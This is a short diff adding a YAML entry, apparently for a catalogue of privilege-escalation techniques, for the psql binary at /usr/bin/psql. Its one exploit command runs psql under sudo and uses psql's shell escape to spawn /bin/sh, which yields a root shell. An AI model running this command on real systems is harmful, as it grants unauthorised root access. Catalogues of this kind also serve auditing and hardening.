@@ -1,0 +1,4 @@
+name: psql
+binary_path: /usr/bin/psql
+exploit_cmds:
+- sudo /usr/bin/psql && \! /bin/sh
